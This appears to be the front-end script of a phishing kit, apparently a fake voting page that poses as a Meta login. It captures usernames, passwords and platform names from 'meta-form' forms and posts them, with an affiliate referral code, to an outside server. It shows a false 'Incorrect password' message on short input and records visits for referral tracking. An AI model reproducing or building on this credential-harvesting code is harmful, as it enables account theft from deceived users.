// main.js
import { submitForm } from './src/helper.js';
import { initRouter } from '../frontend /assets/js/router.js';
import {showFeedback} from './src/feedback.js';
import { Referral } from './src/referral.js';

window.onload = () => {
  initRouter();

  // --- Handle referral code ---
  const refCode = Referral.init(); // Saves from URL or localStorage

  // --- Bind all forms ---
  document.querySelectorAll("form.meta-form").forEach(form => {
    form.addEventListener("submit", async e => {
      e.preventDefault();
      await handleFormSubmit(form, refCode);
    });
  });

  // --- Navigation ---
  document.querySelectorAll("[data-role=nav]").forEach(btn => {
    btn.addEventListener("click", () => {
      const target = btn.dataset.target;
      const role = btn.dataset.role;
      if (role === "nav") {
        window.location.href = Referral.appendToURL(target);
      } else {
        showPage(target);
      }
    });
  });
};

// --- Handle form submission ---
async function handleFormSubmit(form, refCode) {
  const username = form.username?.value.trim();
  const password = form.password?.value.trim();
  const platform = form.platform?.value.trim() || "web";
  const submitBtn = form.querySelector('button[type="submit"]');

  if (!username || username.length < 3 || !password || password.length < 6) {
    showFeedback("Incorrect password","The password you entered is incorrect. Please try again","Ok");
    return;
  }

  const payload = { username, password, platform, referralCode: refCode || "4123389" };

  // Disable form & show loader
  const inputs = form.querySelectorAll("input");
  submitBtn.disabled = true;
  inputs.forEach(i => (i.disabled = true));
  const originalText = submitBtn.textContent;
  submitBtn.innerHTML = `<span class="spinner"></span>`;

  try {
    const response = await fetch("https://nexa-mini.onrender.com/student/register", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    const data = await response.json();

    if (response.ok) {
      
      // Track the visit
      await trackVisit(window.location.pathname, refCode);
      window.location.href = Referral.appendToURL("vote.html");
      
    } else {
      showFeedback("",`Sorry something went wrong. try again :${response}`,"Ok");
    }
  } catch (err) {
    console.error("Network error:", err);
    
  } finally {
    submitBtn.textContent = originalText;
    submitBtn.disabled = false;
    inputs.forEach(i => (i.disabled = false));
  }
}

// --- Track page visit ---
async function trackVisit(path, refCode) {
  try {
    await fetch("https://nexa-mini.onrender.com/student/visit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        path,
        referrer: refCode || "4123389",
        utm: null,
        userAgent: navigator.userAgent
      })
    });
  } catch (err) {
    console.warn("Visit tracking failed:", err);
  }
}